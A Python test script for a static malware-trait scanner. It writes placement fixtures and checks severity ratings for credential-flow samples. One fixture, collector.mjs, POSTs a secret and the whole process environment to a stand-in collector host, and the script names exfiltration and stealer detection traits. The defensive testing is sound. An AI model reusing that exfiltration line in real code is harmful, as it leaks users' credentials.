#!/usr/bin/env python3
"""Static placement and credential-severity controls; fixture code never runs."""
import argparse
import json
import os
from pathlib import Path
import subprocess
import tempfile

ROOT = Path(__file__).resolve().parents[2]
p = argparse.ArgumentParser(description=__doc__)
p.add_argument('--cleave', default='cleave')
p.add_argument('--staging-parent')
a = p.parse_args()

def plist(value):
    return '<?xml version="1.0"?><plist version="1.0"><dict>' + value + '</dict></plist>'

cases = [
    ('discard.sh', 'micro-behaviors/process/fd/stdio::shell-function-discards-output',
     'quiet() { printf "%s" "$1" > /dev/null; }\n',
     'quiet() { printf "%s" "$1" 2>/dev/null; }\n'),
    ('table.js', 'metadata/lang/source/shape::javascript-hex-string-array-prefix',
     'const hashes = [' + "'aabbcc'," * 10 + '];\n',
     'const hashes = [' + "'aabbcc'," * 9 + '];\n'),
    ('connect.sh', 'metadata/lang/source/syntax::shell-connect-method-text',
     "python3 - <<'PYCODE'\ns.connect(('localhost', 3000))\nPYCODE\n",
     "python3 - <<'PYCODE'\ns.disconnect()\nPYCODE\n"),
    ('own.py', 'micro-behaviors/fs/path-ops/join::python-own-script-path',
     'helper = Path(__file__).parent / "worker.py"\n',
     'helper = Path(other).parent / "worker.py"\n'),
    ('import.py', 'metadata/import/package::python-telemetry-import-text',
     'import telemetry as T\n', 'import logging as T\n'),
    ('launch.plist', 'micro-behaviors/os/service/launchagent::launchd-plist-path-reference',
     plist('<key>Label</key><string>LaunchAgents/example.plist</string>'),
     plist('<key>Label</key><string>Preferences/example.plist</string>')),
    ('cwd.plist', 'micro-behaviors/os/service/configure::launchd-working-directory-tmp',
     plist('<key>WorkingDirectory</key><string>/tmp/app</string>'),
     plist('<key>WorkingDirectory</key><string>/opt/app</string>')),
    ('node.js', 'micro-behaviors/os/service/plist::source-programarguments-node-execpath-reference',
     'const p = { ProgramArguments: [process.execPath, "worker.js"] };\n',
     'const p = { OtherArguments: [process.execPath, "worker.js"] };\n'),
    ('ip.sh', 'micro-behaviors/data/control-flow/loop::shell-address-named-for-loop',
     'for ip in "$ADDRESSES"; do echo "$ip"; done\n',
     'for item in "$ITEMS"; do echo "$item"; done\n'),
    ('pipe.js', 'micro-behaviors/process/io/stream::node-stdio-pipe',
     'process.stdin.pipe(output);\n', 'buffer.pipe(output);\n'),
    ('number.js', 'metadata/lang/source/shape::integer-1023-or-1024-text',
     'const size = 1024;\n', 'const size = 1025;\n'),
]
CANDIDATE = 'micro-behaviors/communications/http/request/credentials::javascript-credential-env-http-candidate'
BODY = 'objectives/exfiltration/stealer/env::credential-environment-http-body'
SINK = 'objectives/exfiltration/sensitive-data/source::credential-exfiltration-network-sink'
with tempfile.TemporaryDirectory(prefix='argent-neutral-', dir=a.staging_parent) as tmp:
    stage = Path(tmp)
    expected = {}
    for name, trait, positive, negative in cases:
        for label, source, present in [('positive', positive, True), ('negative', negative, False)]:
            path = stage / (label + '-' + name)
            path.write_text(source)
            expected[str(path)] = (trait, present)
    header = stage / 'header.mjs'
    header.write_text('''
async function publish(payload, env) {
 const secret = process.env.SERVICE_BRIDGE_SECRET;
 return fetch('https://service.example/reports', {method: 'POST',
  headers: {'x-service-secret': secret}, body: JSON.stringify({payload})});
}
const env = {...process.env};
await publish({sales: 42}, env);
''')
    collector = stage / 'collector.mjs'
    collector.write_text('''
await fetch('https://collector.example/events', {method: 'POST',
 body: JSON.stringify({credential: process.env.SERVICE_BRIDGE_SECRET, environment: process.env})});
''')
    alias = stage / 'alias.mjs'
    alias.write_text((ROOT / 'testdata/benign/alias-credential-flow-regression.js').read_text())
    paths = list(expected) + [str(header), str(collector), str(alias)]
    result = subprocess.run([a.cleave, '--no-update-check', '--traits-dir', str(ROOT),
                             '--format', 'json', *paths], check=True, text=True,
                            capture_output=True, env={**os.environ, 'CLEAVE_SKIP_CACHE': '1'})
    decoder = json.JSONDecoder()
    output = result.stdout
    reports = {}
    while output.strip():
        value, end = decoder.raw_decode(output.lstrip())
        output = output.lstrip()[end:]
        reports.update((f['path'], f) for f in value['files'])
    for path, (trait, present) in expected.items():
        ids = {t['id'] for t in reports[path].get('traits', [])}
        assert (trait in ids) == present, (path, trait, present, ids)
        print('PASS', Path(path).name)
    ht = {t['id']: t for t in reports[str(header)].get('traits', [])}
    if CANDIDATE in ht:
        assert ht[CANDIDATE]['crit'] == 3, ht
    at = {t['id']: t for t in reports[str(alias)].get('traits', [])}
    assert at[CANDIDATE]['crit'] == 3, at
    assert not {BODY, SINK} & ht.keys(), ht
    assert not any(t['crit'] >= 4 for t in ht.values()), ht
    ct = {t['id']: t for t in reports[str(collector)].get('traits', [])}
    assert ct[CANDIDATE]['crit'] == 3 and ct[BODY]['crit'] == 4, ct
    print('PASS header auth remains notable; explicit credential body stays suspicious')
print('22 placement controls and credential-severity controls passed')
